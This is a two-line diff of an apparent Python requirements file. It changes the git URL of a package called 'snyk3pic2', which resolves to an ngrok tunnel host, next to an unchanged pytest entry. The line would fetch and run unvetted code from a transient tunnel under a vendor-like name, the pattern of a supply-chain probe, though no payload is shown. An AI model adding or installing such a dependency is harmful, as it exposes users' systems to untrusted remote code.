@@ -1,2 +1,2 @@
 pytest
-snyk3pic2 @ git+https://d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/2
+snyk3pic2 @ git+https://d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/snyk3pic2/snyk3pic2
